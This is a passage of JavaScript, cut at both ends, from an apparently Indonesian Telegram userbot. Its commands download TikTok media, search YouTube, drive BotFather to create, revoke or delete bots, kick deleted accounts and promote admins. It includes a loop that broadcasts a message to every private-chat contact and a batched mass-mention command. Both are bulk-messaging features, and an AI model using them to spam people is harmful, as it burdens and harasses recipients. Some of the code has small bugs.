      console.error("Gagal ambil dialog:", e);
    }

    const users = dialogs.filter(d => d.isUser && !d.isBot);

    if (!users.length) {
      try { if (loading) await client.deleteMessages(chatId, [loading.id]); } catch {}
      return client.sendMessage(chatId, {
        message: `<blockquote>⚠️ ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴜsᴇʀ ᴜɴᴛᴜᴋ ᴅɪᴋɪʀɪᴍ ᴘᴇsᴀɴ</blockquote>`,
        parseMode: "html",
        replyTo: message.id,
      });
    }

    let sukses = 0;
    let gagal = 0;

    for (const u of users) {
      try {
        await client.sendMessage(u.id, { message: text, parseMode: "html" });
        sukses++;
      } catch (e) {
        console.error("Gagal kirim ke user:", u.id, e.message);
        gagal++;
      }
      await new Promise(r => setTimeout(r, 500));
    }

    try { if (loading) await client.deleteMessages(chatId, [loading.id]); } catch {}

    await client.sendMessage(chatId, {
      message: `<blockquote>✅ ᴘᴇɴɢɪʀɪᴍᴀɴ sᴇʟᴇsᴀɪ\n\n<b>👥 ᴛᴏᴛᴀʟ ᴜsᴇʀ: ${users.length}</b>\n✅ ʙᴇʀʜᴀsɪʟ: <b>${sukses}</b>\n❌ ɢᴀɢᴀʟ: <b>${gagal}</b></blockquote>`,
      parseMode: "html",
      replyTo: message.id,
    });
  })();
  break;
}

case 'tt': {
  (async () => {
    try {
      const input = message.text?.trim().split(/\s+/).slice(1).join(" ") || "";
      const urlMatch = input.match(/https?:\/\/[^\s]+/);

      if (!urlMatch) {
        return client.sendMessage(chatId, {
          message: `<blockquote>❌ <b>ᴍᴀsᴜᴋᴋᴀɴ ʟɪɴᴋ ᴛɪᴋᴛᴏᴋ ʏᴀɴɢ ᴠᴀʟɪᴅ!</b></blockquote>`,
          parseMode: "html",
          replyTo: message.id,
        });
      }

      const tiktokUrl = urlMatch[0];

      const loadingMsg = await client.sendMessage(chatId, {
        message: `<blockquote>⏳ <i>ᴍᴇɴɢᴜɴᴅᴜʜ ᴠɪᴅᴇᴏ ᴛɪᴋᴛᴏᴋ...</i></blockquote>`,
        parseMode: "html",
        replyTo: message.id,
      });

      const res = await fetch("https://www.tikwm.com/api/", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8" },
        body: `url=${encodeURIComponent(tiktokUrl)}`,
      });

      const data = await res.json().catch(() => ({}));
      if (!data || data.code !== 0 || !data.data) throw new Error("Video tidak ditemukan atau link salah!");

      const vid = data.data;
      const videoUrl = vid.play || vid.hdplay || vid.wmplay || vid.play_addr;
      if (!videoUrl) throw new Error("Tidak dapat menemukan URL tiktok");
      
      await client.deleteMessages(chatId, [loadingMsg], { revoke: true }).catch(() => {});

      const caption = `<blockquote>🎬 <b>${vid.title || "Video TikTok"}</b>
👤 @${vid.author?.unique_id || "?"}
❤️ ${vid.digg_count} | 💬 ${vid.comment_count}
<a href="${tiktokUrl}">🌐 klik untuk lihat di TikTok</a>

© ʙʏ ʏᴀᴋᴜᴢᴀ 👑</blockquote>`;

      await client.sendFile(chatId, {
        file: videoUrl,
        caption,
        parseMode: "html",
        replyTo: message.id,
      });

      setTimeout(async () => {
        try {
          const msgId = loadingMsg.id || loadingMsg.message?.id;
          if (msgId) {
            await client.deleteMessages(chatId, [msgId]);
          }
        } catch (e) {
          console.log("⚠️ Tidak bisa hapus pesan loading:", e.message);
        }
      }, 2000);

    } catch (err) {
      await client.sendMessage(chatId, {
        message: `<blockquote>❌ <b>ɢᴀɢᴀʟ ᴅᴏᴡɴʟᴏᴀᴅ ᴠɪᴅᴇᴏ!</b>\n${err.message}</blockquote>`,
        parseMode: "html",
        replyTo: message.id,
      });
    }
  })();
  break;
}

case 'ttmp3': {
  (async () => {
    try {
      const input = message.text?.trim().split(/\s+/).slice(1).join(" ") || "";
      const urlMatch = input.match(/https?:\/\/[^\s]+/);

      if (!urlMatch) {
        return client.sendMessage(chatId, {
          message: `<blockquote>❌ <b>ᴍᴀsᴜᴋᴋᴀɴ ʟɪɴᴋ ᴛɪᴋᴛᴏᴋ ʏᴀɴɢ ᴠᴀʟɪᴅ!</b></blockquote>`,
          parseMode: "html",
          replyTo: message.id,
        });
      }

      const tiktokUrl = urlMatch[0];

      const loadingMsg = await client.sendMessage(chatId, {
        message: `<blockquote>⌛️ <i>ᴍᴇɴɢᴜɴᴅᴜʜ ᴀᴜᴅɪᴏ ᴅᴀʀɪ ᴛɪᴋᴛᴏᴋ...</i></blockquote>`,
        parseMode: "html",
        replyTo: message.id,
      });

      const res = await fetch("https://www.tikwm.com/api/", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8" },
        body: `url=${encodeURIComponent(tiktokUrl)}`,
      });

      const data = await res.json().catch(() => ({}));
      if (!data || data.code !== 0 || !data.data) throw new Error("ᴀᴜᴅɪᴏ ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ ᴀᴛᴀᴜ ʟɪɴᴋ sᴀʟᴀʜ!");

      const info = data.data;
      const audioUrl = info.music?.play_url || info.music?.url || info.music || null;
      if (!audioUrl) throw new Error("ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴀᴜᴅɪᴏ ᴅɪ ᴠɪᴅᴇᴏ ᴛɪᴋᴛᴏᴋ ɪɴɪ!");
      
      await client.deleteMessages(chatId, [loadingMsg], { revoke: true }).catch(() => {});

      const caption = `<blockquote>🎵 <b>ᴀᴜᴅɪᴏ ᴛɪᴋᴛᴏᴋ</b>
👤 @${info.author?.unique_id || "?"}
🎧 <b>ᴅᴜʀᴀsɪ:</b> ${info.duration} detik

© ʙʏ ʏᴀᴋᴜᴢᴀ 👑</blcokquote>`;

      await client.sendFile(chatId, {
        file: audioUrl,
        caption,
        parseMode: "html",
        replyTo: message.id,
        voice: false,
      });

      setTimeout(async () => {
        try {
          const msgId = loadingMsg.id || loadingMsg.message?.id;
          if (msgId) await client.deleteMessages(chatId, [msgId]);
        } catch (e) {
          console.log("⚠️ Tidak bisa hapus pesan loading:", e.message);
        }
      }, 2000);

    } catch (err) {
      console.error("❌ TTAUDIO Error:", err);
      await client.sendMessage(chatId, {
        message: `<blockquote>❌ <b>ɢᴀɢᴀʟ ᴍᴇɴɢᴜɴᴅᴜʜ ᴀᴜᴅɪᴏ!</b>\n${err.message}</blockquote>`,
        parseMode: "html",
        replyTo: message.id,
      });
    }
  })();
  break;
}

case 'yts': {
  (async () => {
    try {
      const text = message.text?.split(" ").slice(1).join(" ");
      if (!text) {
        return client.sendMessage(chatId, {
          message: `<blockquote>❌ <b>ᴍᴀsᴜᴋᴋᴀɴ ᴋᴀᴛᴀ ᴋᴜɴᴄɪ ᴜɴᴛᴜᴋ ᴍᴇɴᴄᴀʀɪ ᴠɪᴅᴇᴏ ʏᴏᴜᴛᴜʙᴇ!</b></blockquote>`,
          parseMode: "html",
          replyTo: message.id,
        });
      }

      const loadingMsg = await client.sendMessage(chatId, {
        message: `<blockquote>🔍 <i>ᴍᴇɴᴄᴀʀɪ ᴠɪᴅᴇᴏ ʏᴏᴜᴛᴜʙᴇ ᴜɴᴛᴜᴋ:</i> <b>${text}</b> ...</blockquote>`,
        parseMode: "html",
        replyTo: message.id,
      });

      const yts = require("yt-search");
      const results = await yts(text);
      if (!results.videos || results.videos.length === 0) {
        await client.sendMessage(chatId, {
          message: `<blockquote>❌ <b>ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ ᴠɪᴅᴇᴏ ᴜɴᴛᴜᴋ:</b> ${text}</blockquote>`,
          parseMode: "html",
          replyTo: message.id,
        });
        return;
      }
      
      await client.deleteMessages(chatId, [loadingMsg.id], { revoke: true }).catch(() => {});

      const video = results.videos[0];
      const caption = `
<blockquote>
🎬 <b>${video.title}</b><br>
👤 <b>ᴄʜᴀɴɴᴇʟ:</b> ${video.author.name}<br>
⏱️ <b>ᴅᴜʀᴀsɪ:</b> ${video.timestamp}<br>
👀 <b>ᴠɪᴇᴡs:</b> ${video.views.toLocaleString()}<br>
📅 <b>ᴜᴘʟᴏᴀᴅ:</b> ${video.ago}<br><br>
🔗 <a href="${video.url}">🎬 Klik untuk tonton di YouTube</a>\n© ʙʏ ʏᴀᴋᴜᴢᴀ 👑
</blockquote>
`;

      try {
        await client.sendFile(chatId, {
          file: video.image,
          caption,
          parseMode: "html",
          replyTo: message.id,
        });
      } catch (err) {
        console.error("Gagal kirim thumbnail:", err.message);
        await client.sendMessage(chatId, {
          message: `${caption}\n🔗 ${video.url}`,
          parseMode: "html",
          replyTo: message.id,
        });
      }

      setTimeout(async () => {
        try {
          const msgId = loadingMsg.id || loadingMsg.message?.id;
          if (msgId) await client.deleteMessages(chatId, [msgId]);
        } catch {}
      }, 2000);

    } catch (err) {
      console.error("❌ YTS Error:", err);
      await client.sendMessage(chatId, {
        message: `<blockquote>❌ <b>ᴛᴇʀᴊᴀᴅɪ ᴋᴇsᴀʟᴀʜᴀɴ sᴀᴀᴛ ᴍᴇɴᴄᴀʀɪ ᴠɪᴅᴇɪ ʏᴏᴜᴛᴜʙᴇ!</b></blockquote>`,
        parseMode: "html",
        replyTo: message.id,
      });
    }
  })();
  break;
}

case 'tagall': {
  (async () => {
    try {
      if (!message.isGroup) {
        return await client.sendMessage(message.chat.id, { 
          message: "<blockquote>⚠️ ʜᴀɴʏᴀ ʙɪsᴀ ᴅɪɢᴜɴᴀᴋᴀɴ ᴅɪ ɢʀᴏᴜᴘ!</blockquote>", 
          parseMode: "html",
          replyTo: message.id 
        });
      }

      if (tagallChats.has(message.chat.id.toString())) {
        return await client.sendMessage(message.chat.id, { 
          message: "<blockquote>⚠️ ᴛᴀɢᴀʟʟ sᴇᴅᴀɴɢ ʙᴇʀᴊᴀʟᴀɴ ᴅɪ ɢʀᴏᴜᴘ ɪɴɪ</blockquote>", 
          parseMode: "html",
          replyTo: message.id 
        });
      }

      tagallChats.add(message.chat.id.toString());

      const customText = message.text.split(" ").slice(1).join(" ") || "";
      const participants = await client.getParticipants(message.chat.id);
      const users = participants
        .filter(u => !u.deleted && !u.bot)
        .map(u => `<a href="tg://user?id=${u.id}">${randomEmoji()}</a>`);

      for (let i = users.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [users[i], users[j]] = [users[j], users[i]];
      }

      let index = 0;
      const batchSize = 5;

      (async function sendBatch() {
        if (!tagallChats.has(message.chat.id.toString())) return;
        const batch = users.slice(index, index + batchSize);
        if (batch.length === 0) {
          tagallChats.delete(message.chat.id.toString());
          return;
        }
        try {
          await client.sendMessage(message.chat.id, {
            message: `${customText}\n\n${batch.join(" ")}`,
            parseMode: "html",
            replyTo: message.id
          });
        } catch {}
        index += batchSize;
        setTimeout(sendBatch, 2000);
      })();

    } catch (err) {
      console.error("❌ Tagall Error:", err);
      tagallChats.delete(message.chat.id.toString());
      await client.sendMessage(message.chat.id, {
        message: "<blockquote>❌ ᴛᴇʀᴊᴀᴅɪ ᴋᴇsᴀʟᴀʜᴀɴ sᴀᴀᴛ ᴍᴇɴᴊᴀʟᴀɴᴋᴀɴ ᴛᴀɢᴀʟʟ</blockquote>",
        parseMode: "html",
        replyTo: message.id
      });
    }
  })();
  break;
}

case 'batal': {
  (async () => {
    try {
      if (!message.isGroup) {
        return await client.sendMessage(message.chat.id, { 
          message: "<blockquote>⚠️ ʜᴀɴʏᴀ ʙɪsᴀ ᴅɪɢᴜɴᴀᴋᴀɴ ᴅɪ ɢʀᴏᴜᴘ!</blockquote>", 
          parseMode: "html",
          replyTo: message.id 
        });
      }

      if (!tagallChats.has(message.chat.id.toString())) {
        return await client.sendMessage(message.chat.id, { 
          message: "<blockquote>❌ ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴘᴇʀɪɴᴛᴀʜ ᴛᴀɢᴀʟʟ ʏᴀɴɢ ʙᴇʀᴊᴀʟᴀɴ</blockquote>", 
          parseMode: "html",
          replyTo: message.id 
        });
      }

      tagallChats.delete(message.chat.id.toString());
      await client.sendMessage(message.chat.id, { 
        message: "<blockquote>✅ ᴛᴀɢᴀʟʟ ʙᴇʀʜᴀsɪʟ ᴅɪʙᴀᴛᴀʟᴋᴀɴ</blockquote>", 
        parseMode: "html",
        replyTo: message.id 
      });
    } catch (err) {
      console.error("❌ Batal Tagall Error:", err);
      await client.sendMessage(message.chat.id, {
        message: "<blockquote>❌ ᴛᴇʀᴊᴀᴅɪ ᴋᴇsᴀʟᴀʜᴀɴ sᴀᴀᴛ ᴍᴇᴍʙᴀᴛᴀʟᴋᴀɴ ᴛᴀɢᴀʟʟ</blockquote>",
        parseMode: "html",
        replyTo: message.id
      });
    }
  })();
  break;
}

case 'createbot': {
  (async () => {
    try {
      const chatId = message.chat.id;
      const raw = message.text?.split(" ").slice(1).join(" ") || "";
      if (!raw.includes("|")) {
        return client.sendMessage(chatId, {
          message: `<blockquote>⚠️ <b>ғᴏʀᴍᴀᴛ:</b> ${prefix}createbot <Nama Bot> | <username_bot>\nContoh: ${prefix}createbot Kings | Kings_bot</blockquote>`,
          parseMode: "html",
          replyTo: message.id
        });
      }

      const [botNameRaw, botUsernameRaw] = raw.split("|").map(s => s.trim());
      const botName = botNameRaw;
      const botUsername = botUsernameRaw;

      if (!(botUsername.endsWith("Bot") || botUsername.endsWith("_bot") || botUsername.endsWith("bot"))) {
        return client.sendMessage(chatId, {
          message: "<blockquote>❌ ᴜsᴇʀɴᴀᴍᴇ ʙᴏᴛ ʜᴀʀᴜs ᴅɪᴀᴋʜɪʀɪ ᴅᴇɴɢᴀɴ 'Bot' ᴀᴛᴀᴜ '_bot'</blockquote>",
          parseMode: "html",
          replyTo: message.id
        });
      }

      const botfather = await client.getEntity("BotFather");

      await client.sendMessage(botfather, { message: "/newbot" });
      await new Promise(r => setTimeout(r, 1500));
      await client.sendMessage(botfather, { message: botName });
      await new Promise(r => setTimeout(r, 1500));
      await client.sendMessage(botfather, { message: botUsername });

      const waitingMsg = await client.sendMessage(chatId, {
        message: `<blockquote>🚀 ᴘʀᴏɢʀᴇss ᴍᴇᴍʙᴜᴀᴛ ʙᴏᴛ <b>${botName}</b></blockquote>`,
        parseMode: "html",
        replyTo: message.id
      });

      const timeoutMs = 60 * 1000;
      const start = Date.now();
      let token = null;

      while (Date.now() - start < timeoutMs) {
        const msgs = await client.getMessages(botfather, { limit: 10 });
        for (const m of msgs) {
          const text = (m.text || m.message || "").toString();
          if (text.includes(botUsername)) {
            const match = text.match(/(\d{6,12}:[\w-]+)/);
            if (match) {
              token = match[1];
              break;
            }
          }
        }
        if (token) break;
        await new Promise(r => setTimeout(r, 2000));
      }

      await new Promise(r => setTimeout(r, 1000));

      try {
        if (waitingMsg && waitingMsg.id) {
          await client.deleteMessages(chatId, [waitingMsg.id], { revoke: true });
        }
      } catch (err) {
        console.log("⚠️ Gagal hapus pesan status:", err.message);
      }

      if (token) {
        await client.sendMessage(chatId, {
          message: `<blockquote>✅ <b>ʙᴏᴛ ʙᴇʀʜᴀsɪʟ ᴅɪʙᴜᴀᴛ!</b>\n\n🤖 <b>ɴᴀᴍᴀ ʙᴏᴛ:</b> ${botName}\n🔗 <b>ᴜsᴇʀɴᴀᴍᴇ:</b> @${botUsername}\n\n🔑 <b>ᴛᴏᴋᴇɴ:</b>\n<code>${token}</code></blockquote>`,
          parseMode: "html",
          replyTo: message.id
        });
      } else {
        await client.sendMessage(chatId, {
          message: `<blockquote>⚠️ ᴛɪᴅᴀᴋ ʙɪsᴀ ᴍᴇɴᴇᴍᴜᴋᴀɴ ᴛᴏᴋᴇɴ ᴜɴᴛᴜᴋ @${botUsername}. ᴄᴏʙᴀ ᴄᴇᴋ ʟᴀɴɢsᴜɴɢ ᴅɪ @BotFather</blockquote>`,
          parseMode: "html",
          replyTo: message.id
        });
      }

    } catch (err) {
      console.error("createbot error:", err);
      await client.deleteMessages(chatId, [waitingMsg.id], { revoke: true });
      await client.sendMessage(message.chat.id, {
        message: `<blockquote>❌ ᴛᴇʀᴊᴀᴅɪ ᴋᴇsᴀʟᴀʜᴀɴ: ${err.message}</blockquote>`,
        parseMode: "html",
        replyTo: message.id
      });
    }
  })();
  break;
}

case "revoke": {
  (async () => {
    try {
      const chatId = message.chat.id;
      const input = message.text?.split(" ").slice(1).join(" ").trim() || "";

      if (!input) {
        return client.sendMessage(chatId, {
          message: `<blockquote>⚠️ <b>ғᴏʀᴍᴀᴛ:</b> ${prefix}revoke <@username_bot></blockquote>`,
          parseMode: "html",
          replyTo: message.id
        });
      }

      const botUsername = input.replace("@", "");
      if (!botUsername.toLowerCase().endsWith("bot")) {
        return client.sendMessage(chatId, {
          message: "<blockquote>❌ ᴜsᴇʀɴᴀᴍᴇ ʙᴏᴛ ʜᴀʀᴜs ᴅɪᴀᴋʜɪʀɪ ᴅᴇɴɢᴀɴ 'Bot'</blockquote>",
          parseMode: "html",
          replyTo: message.id
        });
      }

      const botfather = await client.getEntity("BotFather");

      await client.sendMessage(botfather, { message: "/revoke" });
      await new Promise(r => setTimeout(r, 1500));
      await client.sendMessage(botfather, { message: `@${botUsername}` });

      const waitingMsg = await client.sendMessage(chatId, {
        message: `<blockquote>⏳ sᴇᴅᴀɴɢ ʀᴇsᴇᴛ ᴛᴏᴋᴇɴ ʟᴀᴍᴀ ᴋᴇ ʙᴀʀᴜ ᴅᴀʀɪ <b>@BotFather</b> ᴜɴᴛᴜᴋ <b>@${botUsername}</b></blockquote>`,
        parseMode: "html",
        replyTo: message.id
      });

      const tokenRegex = /(\d{5,12}:[A-Za-z0-9_-]{30,})/i;
      let tokenBaru = null;

      const start = Date.now();
      while (Date.now() - start < 60000) {
        const messages = await client.getMessages("BotFather", { limit: 1 });
        if (messages.length > 0) {
          const msgText = messages[0].message || "";
          const match = msgText.match(tokenRegex);
          if (match) {
            tokenBaru = match[1];
            break;
          }
        }
        await new Promise(r => setTimeout(r, 1500));      }

      try {
        await client.deleteMessages(chatId, [waitingMsg.id], { revoke: true });
      } catch {}

      if (tokenBaru) {
        await client.sendMessage(chatId, {
          message:
            `<blockquote>✅ <b>ᴛᴏᴋᴇɴ ʙᴀʀᴜ ʙᴇʀʜᴀsɪʟ ᴅɪᴀᴍʙɪʟ!</b>\n🤖 ʙᴏᴛ: @${botUsername}\n🔑 ᴛᴏᴋᴇɴ ʙᴀʀᴜ:</blockquote> <code>${tokenBaru}</code></blockquote>`,
          parseMode: "html",
          replyTo: message.id
        });
      } else {
        await client.sendMessage(chatId, {
          message: `<blockquote>⚠️ ɢᴀɢᴀʟ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴛᴏᴋᴇɴ ʙᴀʀᴜ. ᴄᴇᴋ ʟᴀɴɢsᴜɴɢ ᴅɪ @BotFather</blockquote>`,
          parseMode: "html",
          replyTo: message.id
        });
      }

    } catch (err) {
    await client.deleteMessages(chatId, [waitingMsg.id], { revoke: true });
      await client.sendMessage(message.chat.id, {
        message: `<blockquote>❌ ᴛᴇʀᴊᴀᴅɪ ᴋᴇsᴀʟᴀʜᴀɴ: ${err.message}</blockquote>`,
        parseMode: "html",
        replyTo: message.id
      });
    }
  })();
  break;
}

case "delbot": {
  (async () => {
    try {
      const chatId = message.chat.id;
      const input = message.text?.split(" ").slice(1).join(" ").trim() || "";

      if (!input) {
        return client.sendMessage(chatId, {
          message: `<blockquote>⚠️ <b>Format:</b> ${prefix}delbot <@username_bot>\nContoh: ${prefix}delbot @kings_bot</blockquote>`,
          parseMode: "html",
          replyTo: message.id
        });
      }

      const botUsername = input.replace("@", "");
      if (!botUsername.toLowerCase().endsWith("bot")) {
        return client.sendMessage(chatId, {
          message: "<blockquote>❌ ᴜsᴇʀɴᴀᴍᴇ ʙᴏᴛ ʜᴀʀᴜs ᴅɪᴀᴋʜɪʀɪ ᴅᴇɴɢᴀɴ 'Bot'</blockquote>",
          parseMode: "html",
          replyTo: message.id
        });
      }

      const botfather = await client.getEntity("BotFather");

      await client.sendMessage(botfather, { message: "/deletebot" });
      await new Promise(r => setTimeout(r, 1500));
      await client.sendMessage(botfather, { message: `@${botUsername}` });

      const loading = await client.sendMessage(chatId, {
        message: `<blockquote>⏳ ᴍᴇɴɢʜᴀᴘᴜs ʙᴏᴛ <b>@${botUsername}</b> ᴅᴀʀɪ <b>@BotFather</b>...</blockquote>`,
        parseMode: "html",
        replyTo: message.id
      });

      const start = Date.now();
      let status = null;
      let lastMsg = "";

      while (Date.now() - start < 90000) {
        const msgs = await client.getMessages("BotFather", { limit: 1 });
        if (msgs.length > 0) {
          const msg = msgs[0].message || "";
          lastMsg = msg;

          if (/are you sure/i.test(msg)) {
            await new Promise(r => setTimeout(r, 1500));
            await client.sendMessage(botfather, { message: "Yes, I am totally sure." });
          }

          if (/Done! The bot is gone\.|has been deleted|deleted successfully/i.test(msg)) {
            status = "deleted";
            break;
          }

          if (/couldn't find|not found|doesn't exist/i.test(msg)) {
            status = "not_found";
            break;
          }
        }
        await new Promise(r => setTimeout(r, 2000));
      }

      try {
        await client.deleteMessages(chatId, [loading.id], { revoke: true });
      } catch {}

      if (status === "deleted") {
        await client.sendMessage(chatId, {
          message: `<blockquote>✅ <b>ʙᴏᴛ @${botUsername} ʙᴇʀʜᴀsɪʟ ᴅɪʜᴀᴘᴜs ᴅᴀʀɪ @BotFather!</b></blockquote>`,
          parseMode: "html",
          replyTo: message.id
        });
      } else if (status === "not_found") {
        await client.sendMessage(chatId, {
          message: `<blockquote>❌ ʙᴏᴛ <b>@${botUsername}</b> ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ ᴅɪ ᴅᴀғᴛᴀʀ ʙᴏᴛғᴀᴛʜᴇʀ</blockquote>`,
          parseMode: "html",
          replyTo: message.id
        });
      } else {
        await client.sendMessage(chatId, {
          message: `<blockquote>⚠️ ᴛɪᴅᴀᴋ ᴀᴅᴀ ʀᴇsᴘᴏɴ ᴅᴀʀɪ ʙᴏᴛғᴀᴛʜᴇʀ\nᴘᴇsᴀɴ ᴛᴇʀᴀᴋʜɪʀ: <b>${lastMsg}</b></blockquote>`,
          parseMode: "html",
          replyTo: message.id
        });
      }

    } catch (err) {
      await client.deleteMessages(chatId, [waitingMsg], { revoke: true });
      await client.sendMessage(message.chat.id, {
        message: `<blockquote>❌ ᴛᴇʀᴊᴀᴅɪ ᴋᴇsᴀʟᴀʜᴀɴ: ${err.message}</blockquote>`,
        parseMode: "html",
        replyTo: message.id
      });
    }
  })();
  break;
}

case "q":
  await handlerQ(message, client, prefix);
  break;

case 'tohd':
  await handlerTohd(message, client, args, prefix);
  break;

case "update": {
  (async () => {
    await updateHandler(message, client);
  })();
  break;
}

case "ping": {
  (async () => {
    try {
      const chatId = message.chatId || message.chat?.id;
      const start = Date.now();

      const tempMsg = await client.sendMessage(chatId, {
        message: "<blockquote>🏓 Ping...</blockquote>",
        parseMode: "html",
        replyTo: message.id,
      });

      const latency = Date.now() - start;

      try {
        await client.deleteMessages(chatId, [tempMsg.id], { revoke: true }).catch(() => {});
      } catch {}

      await client.sendMessage(chatId, {
        message: `<blockquote>🏓 Pong!\nLatency: ${latency} ms</blockquote>`,
        parseMode: "html",
        replyTo: message.id,
      });

    } catch (e) {
      await client.deleteMessages(chatId, [tempMsg.id], { revoke: true }).catch(() => {});
      await client.sendMessage(message.chatId, {
        message: `<blockquote>❌ ᴛᴇʀᴊᴀᴅɪ ᴋᴇsᴀʟᴀʜᴀɴ: ${e.message}</blockquote>`,
        parseMode: "html",
        replyTo: message.id,
      });
    }
  })();
  break;
}

case "zombies": {
  (async () => {
    try {
      const chatId = message.chatId || message.chat?.id;
      const senderId = message.senderId?.toString?.() || (message.from && String(message.from.id));

      if (!message.isGroup && !message.isSuperGroup && !message.isChannel) {
        return client.sendMessage(chatId, {
          message: "<blockquote>⚠️ ᴘᴇʀɪɴᴛᴀʜ ɪɴɪ ʜᴀɴʏᴀ ʙɪsᴀ ᴅɪ ɢʀᴏᴜᴘ</blockquote>",
          parseMode: "html",
          replyTo: message.id
        });
      }

      let loading;
      try {
        loading = await client.sendMessage(chatId, {
          message: "<blockquote>🔍 ᴍᴇɴᴄᴀʀɪ ᴀᴋᴜɴ ᴛᴇʀʜᴀᴘᴜs...</blockquote>",
          parseMode: "html",
          replyTo: message.id
        });
      } catch {
        loading = null;
      }
      
      let participants = [];
      try {
        if (typeof client.getParticipants === "function") {
          participants = await client.getParticipants(chatId);
        } else if (typeof client.getChatMembers === "function") {
          participants = await client.getChatMembers(chatId);
        } else if (typeof client.getFullChat === "function") {
          const full = await client.getFullChat(chatId);
          participants = full?.participants || [];
        } else {
          throw new Error("Client tidak mendukung getParticipants");
        }
      } catch (e) {
        if (loading) try { await client.deleteMessages(chatId, [loading.id]); } catch {}
        return client.sendMessage(chatId, {
          message: `<blockquote>❌ ɢᴀɢᴀʟ ᴍᴇɴɢᴀᴍʙɪʟ ᴀᴋᴜɴ ᴛᴇʀʜᴀᴘᴜs ᴅᴀʀɪ ɢʀᴏᴜᴘ: ${e.message}</blockquote>`,
          parseMode: "html",
          replyTo: message.id
        });
      }
      
      const zombies = participants.filter(p => {
        try {
          const user = p.user || p || {};
          const name = `${user.firstName || ""} ${user.lastName || ""}`.trim();
          return (
            user.deleted === true ||
            user.isDeleted === true ||
            !user.firstName && !user.lastName && !user.username && user.id &&
            /deleted/i.test(user.username || name)
          );
        } catch {
          return false;
        }
      });
      
      if (!zombies.length) {
        if (loading) try { await client.deleteMessages(chatId, [loading.id], { revoke: true }); } catch {}
        return client.sendMessage(chatId, {
          message: "<blockquote>✅ ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴀᴋᴜɴ ᴛᴇʀʜᴀᴘᴜs ᴅɪ ɢʀᴏᴜᴘ ɪɴɪ</blockquote>",
          parseMode: "html",
          replyTo: message.id
        });
      }
      

      let removed = 0, failed = 0;

      for (const z of zombies) {
        const uid = (z.user?.id || z.id || z.userId);
        if (!uid) continue;

        try {
          if (typeof client.kickParticipant === "function")
            await client.kickParticipant(chatId, uid);
          else if (typeof client.kick === "function")
            await client.kick(chatId, uid);
          else if (typeof client.removeParticipant === "function")
            await client.removeParticipant(chatId, uid);
          else if (typeof client.invoke === "function" && typeof Api !== "undefined")
            await client.invoke(new Api.channels.EditBanned({
              channel: chatId,
              participant: uid,
              banned_rights: { until_date: 0, view_messages: true }
            }));
          removed++;
        } catch {
          failed++;
        }

        await new Promise(r => setTimeout(r, 900));      }

      if (loading) try { await client.deleteMessages(chatId, [loading.id], { revoke: true }); } catch {}
      

      await client.sendMessage(chatId, {
        message: `<blockquote>✅ ᴘᴇᴍʙᴇʀsɪʜᴀɴ sᴇʟᴇsᴀɪ\n\n🧟‍♂️ ᴛᴏᴛᴀʟ ᴢᴏᴍʙɪᴇ: <b>${zombies.length}</b>\n✅ ᴅɪᴋᴇʟᴜᴀʀᴋᴀɴ: <b>${removed}</b>\n❌ ɢᴀɢᴀʟ: <b>${failed}</b></blockquote>`,
        parseMode: "html",
        replyTo: message.id
      });
      
    } catch (err) {
      if (typeof loading !== "undefined" && loading)
        try { await client.deleteMessages(message.chat?.id || message.chatId, [loading.id]); } catch {}
      await client.deleteMessages(chatId, [loading.id], { revoke: true }).catch(() => {});
      await client.sendMessage(message.chat?.id || message.chatId, {
        message: `<blockquote>❌ ᴛᴇʀᴊᴀᴅɪ ᴋᴇsᴀʟᴀʜᴀɴ: <code>${String(err.message)}</code></blockquote>`,
        parseMode: "html",
        replyTo: message.id
      });
    }
  })();
  break;
}

function escapeHtml(text) {
  return text?.replace(/[&<>'"]/g, (c) => ({
    "&": "&amp;", "<": "&lt;", ">": "&gt;", "'": "&#39;", '"': "&quot;"
  }[c])) || "";
}

case "promote": {
  (async () => {
    try {
      const chatId = message.chatId || message.chat?.id;
      const args = (message.text || "").trim().split(/\s+/).slice(1);
      const replyMsg = message.replyTo ? await message.getReplyMessage() : null;

      let targetId = null;
      let rank = "admin";

      if (replyMsg) {
        targetId = replyMsg.senderId || replyMsg.fromId?.userId || replyMsg.sender?.id;
        if (args.length >= 1) rank = args.join(" ").trim();
      } else if (args.length >= 1) {
        const lookup = args[0].replace(/^@/, "").trim(); 
        
        try {
          const ent = await client.getEntity(lookup);
          targetId = ent?.id || ent?.userId;
        } catch {
          try {
            const parts = await client.getParticipants(chatId);
            const found = parts.find(u => {
              const uname = (u.username || "").toLowerCase();
              const fname = (u.firstName || u.first_name || "").toLowerCase();
              const lname = (u.lastName || u.last_name || "").toLowerCase();
              return (
                uname === lookup.toLowerCase() ||
                fname === lookup.toLowerCase() ||
                `${fname} ${lname}`.trim() === lookup.toLowerCase()
              );
            });
            targetId = found?.id || found?.user?.id;
          } catch {}
        }

        if (args.length > 1) {
          rank = args.slice(1).join(" ").trim();
        }
      }

      if (!targetId) {
        return client.sendMessage(chatId, {
          message: "<blockquote>❌ ᴛɪᴅᴀᴋ ᴍᴇɴᴇᴍᴜᴋᴀɴ ᴋᴀᴄᴜɴɢ</blockquote>",
          parseMode: "html",
          replyTo: message.id,
        });
      }

      rank = String(rank).slice(0, 32);

      let chatEntity = null;
      try {
        chatEntity = await client.getEntity(chatId);
      } catch {}

      const adminRights = new Api.ChatAdminRights({
        changeInfo: true,
        postMessages: true,
        editMessages: true,
        deleteMessages: true,
        banUsers: true,
        inviteUsers: true,
        pinMessages: true,
        addAdmins: false,
        anonymous: false,
        manageCalls: false,
      });

      async function tryEditAdmin(rankToUse) {
        try {
          await client.invoke(
            new Api.channels.EditAdmin({
              channel: chatEntity || chatId,
              userId: targetId,
              adminRights,
              rank: rankToUse,
            })
          );
          return true;
        } catch (err) {
          throw err;
        }
      }

      try {
        await tryEditAdmin(rank);
      } catch (err) {
        const msg = String(err?.message || err);
        if (msg.includes("ADMIN_RANK_INVALID")) {
